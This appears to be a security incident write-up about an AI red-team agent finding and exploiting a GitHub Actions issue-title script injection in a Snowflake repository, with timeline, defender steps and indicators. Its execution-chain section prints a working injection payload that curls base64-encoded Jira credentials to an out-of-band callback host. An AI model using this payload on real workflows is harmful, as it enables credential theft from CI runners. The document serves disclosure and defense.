# Wiz Red Agent discovers Snowflake GitHub Actions script injection

## Summary
Wiz Research's autonomous "Red Agent" AI security-research tool identified a critical GitHub Actions workflow script-injection vulnerability in `snowflakedb/snowflake-connector-net` through Snowflake's HackerOne program. The vulnerability allowed an unauthenticated user to execute arbitrary commands on Snowflake's GitHub Actions runner by opening a GitHub issue with a specially crafted title. The flaw became live on June 18, 2026 when PR #1218 was squash-merged, and was disclosed and remediated on June 23, 2026—after a five-day exposure window.

The incident is notable because it demonstrates that critical vulnerabilities can be introduced and approved within AI-assisted development workflows, pass automated security scanning (GitHub Advanced Security scanned the final revision without flagging the injection), and still be rapidly discovered and exploited by an autonomous AI security agent.

## Tags
- ops
- operations
- GitHub Actions
- script injection
- CI/CD
- AI agents
- responsible disclosure
- Snowflake
- Jira
- workflow injection
- unauthenticated access
- credential exfiltration

## Why this matters
- The vulnerable workflow triggered on `issues: opened`—any GitHub user could fire it by creating an issue. The attacker-controlled issue title was interpolated directly into a shell `run:` block after GitHub template expansion, making it an unauthenticated remote-code-execution path into Snowflake's CI/CD runner.
- GitHub Advanced Security explicitly extracted and analyzed the vulnerable `jira_issue.yml` workflow in the final PR revision but did not flag the injection. The safe `env:` + `jq --arg` parsing pattern that previously prevented this class of bug was removed in the same PR that introduced the vulnerable direct-interpolation pattern.
- An `if:` guard appeared protective but was always true: on `issues` events, `github.event.pull_request` is null, so the condition `null != 'whitesource-for-github-com[bot]'` evaluated to true for every user.
- The exfiltrated Jira token authenticated as `qa@snowflake.net` to `snowflakecomputing.atlassian.net`, granting read access across Snowflake's engineering, security-compliance, and bug-bounty-tracking Jira projects.
- Wiz's August 17 update clarified that Copilot was a co-author that checked the merged PR and code change and identified it as all-clear without noticing the critical vulnerability. It is unclear whether the code change itself was AI-assisted.
- The five-day exposure window (June 18–23) and same-day patching demonstrate that automated AI security discovery can compress the window from months to days, but the vulnerability was still live long enough for an unauthenticated attacker to exploit it.

## Reported execution chain
1. PR #1218 ("SNOW-2069227: Update jira workflows") removed the safe `env: ISSUE_TITLE:` + `jq -n --arg title "$ISSUE_TITLE"` pattern from `jira_issue.yml` and replaced it with direct interpolation: `TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\'/g")`.
2. The workflow triggered on `issues: opened`. The `sed` escaping runs after GitHub's template expansion, so a single quote in the issue title breaks out of the `echo '...'` string and allows arbitrary command execution.
3. The `if:` guard (`github.event.pull_request.user.login != 'whitesource-for-github-com[bot]'`) was always true on `issues` events because `github.event.pull_request` is null.
4. An attacker opens an issue with a crafted title such as `' ; curl -s "https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo '` to exfiltrate Jira credentials via an out-of-band callback.
5. The GitHub Actions runner (Azure IP `20.106.182[.]197`) executes the injected command and sends base64-encoded credentials to the attacker's callback.
6. The exfiltrated token is used to authenticate as `qa@snowflake.net` to `snowflakecomputing.atlassian.net`.

Wiz Red Agent's initial exfiltration attempt used a standard `#` comment character, which caused a bash syntax error because the comment consumed the closing parenthetical of `TITLE=$(...)`. The agent autonomously analyzed the error, adjusted the payload to use `; echo '` to properly close the shell block, and successfully received the callback.

## Disclosure and remediation timeline
| Date | Event |
|---|---|
| June 18, 2026 | Vulnerability becomes live when PR #1218 is squash-merged as commit `4a1b8ce`. |
| June 23, 2026 | Wiz identifies, exploits, and reports the vulnerability to Snowflake via HackerOne (report #3819931). |
| June 23, 2026 | Slack notification sent to Snowflake security team. |
| June 23, 2026 | Snowflake patches the vulnerable workflow (commit `1dc7766`, PR #1402), restoring the safe `env:` + `jq --arg` pattern. |
| June 24, 2026 | Jira token rotated. |
| July 25, 2026 | Public disclosure deadline (30 days after June 25 resolution, per Snowflake's disclosure policy). |
| August 17, 2026, 19:57 UTC | Wiz blog updated to clarify Copilot's role as co-author that checked the merged PR without flagging the vulnerability. |

Snowflake's forensic audit-log analysis confirmed that no external third parties accessed the Jira endpoint during the five-day exposure window. All anomalous queries were strictly matched to Wiz's testing IPs. Wiz confirmed that all data accessed during proof-of-concept testing was securely deleted.

## Defender actions

### Immediate exposure check
1. Audit GitHub Actions workflows for direct interpolation of `github.event.issue.title`, `github.event.comment.body`, or other user-controlled event data into `run:` blocks.
2. Prefer the `env:` variable + `jq --arg` or equivalent parameterized parsing pattern over shell string interpolation for untrusted event data.
3. Review `if:` guard conditions on issue-event-triggered workflows. On `issues` events, `github.event.pull_request` is null; guards that reference it are always true.
4. Verify that GitHub Advanced Security or equivalent SAST is configured to scan workflow files in the same revision that is merged, not only the base branch.

### If a workflow was vulnerable
1. Rotate all credentials accessible from the runner: Jira tokens, cloud keys, API keys, CI/CD secrets, and repository tokens.
2. Review GitHub audit logs for issue creation by unauthenticated or anomalous users during the exposure window.
3. Review the runner's egress logs for out-of-band callback traffic.
4. Check Jira and other connected SaaS audit logs for anomalous authentication from runner IPs.
5. Verify that the patch restored the safe parsing pattern and did not introduce a new injection vector.

### Preventive controls
- Deny direct interpolation of untrusted GitHub event data into `run:` blocks. Use `env:` variables with parameterized parsing.
- Require security review for PRs that modify workflow `run:` blocks, especially when the change replaces a safe pattern with a simpler one.
- Treat AI-assisted or AI-reviewed code changes with the same static-analysis and security scrutiny as human-written code. The probabilistic nature of LLM code generation can reintroduce deprecated or insecure patterns.
- Use short-lived, least-privilege credentials in CI/CD runners so that a single token leak does not grant broad access.
- Stream GitHub audit logs to an external system to preserve visibility beyond the seven-day GitHub Enterprise Cloud retention window.

## Indicators and hunting pivots
- `snowflakedb/snowflake-connector-net` `jira_issue.yml` workflow
- Commit `094038e` (introduced vulnerable pattern), commit `4a1b8ce` (PR #1218 squash-merge that made it live), commit `1dc7766` (PR #1402 fix)
- GitHub Actions runner Azure IP `20.106.182[.]197`
- Jira instance `snowflakecomputing.atlassian.net`
- Jira user `qa@snowflake.net`
- HackerOne report #3819931

## Confidence and attribution
- The vulnerability, exploitation, and remediation are confirmed by Wiz's responsible disclosure and Snowflake's public response.
- Wiz Red Agent is an autonomous AI security-research tool operated by Wiz Research. Its discovery and exploitation of the vulnerability was part of Snowflake's HackerOne program.
- The August 17 update clarifies that Copilot was a co-author that checked the merged PR without flagging the vulnerability. It is unclear whether the vulnerable code change was AI-assisted.

## Open questions
- Whether the vulnerable code change was AI-generated or human-written; the August 17 update only confirms Copilot reviewed it as all-clear.
- Whether the same or similar injection patterns exist in other Snowflake or third-party GitHub Actions workflows.
- Whether the five-day exposure window represents a typical gap between AI-assisted vulnerability introduction and automated AI security discovery.

## Related pages
- [GitHub Actions deployment poisoning](../patterns/deployment-poisoning-github-actions.md)
- [Agentic workflow trust-boundary failures](../patterns/agentic-workflow-trust-boundary-failures.md)
- [AI-augmented adversary operations](../patterns/ai-augmented-adversary-operations.md)
- [GitHub API enumeration and access-token abuse](../patterns/github-api-enumeration-token-abuse.md)

## Sources
- Wiz Research: [Wiz Red Agent Finds Its Way Into Snowflake's Internal Jira Through a Flaw in a GitHub Actions Workflow](https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug)
